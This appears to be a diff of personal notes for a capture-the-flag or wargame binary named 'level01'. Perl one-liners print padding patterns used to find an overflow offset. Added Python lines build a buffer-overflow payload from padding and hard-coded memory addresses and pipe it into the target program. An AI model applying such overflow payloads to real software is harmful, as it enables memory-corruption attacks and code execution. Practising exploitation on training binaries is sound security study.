@@ -2,6 +2,14 @@ perl -e 'print for "a" .. "z", "A" .. "Z", 0 .. 9'
 
 perl -e '$,=" ";print ("\nor just 100 As\n\n\n")'
 perl -e '$,=" ";print ("A" x100)'
+
 perl -e '$,=" ";print ("\nor just 50 As plus text\n\n\n")'
 perl -e '$,=" ";print ("A" x50)'
 perl -e 'print for "a" .. "z", "A" .. "Z", 0 .. 9'
+
+perl -e '$,=" ";print ("\nor just 80 As\n\n\n")'
+perl -e '$,=" ";print ("A" x80)'
+
+python -c 'print "dat_wil\n"+"U"*80+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > ./tmp
+
+python -c 'print "\ncat /tmp/tmp /dev/stdin | ./level01"'
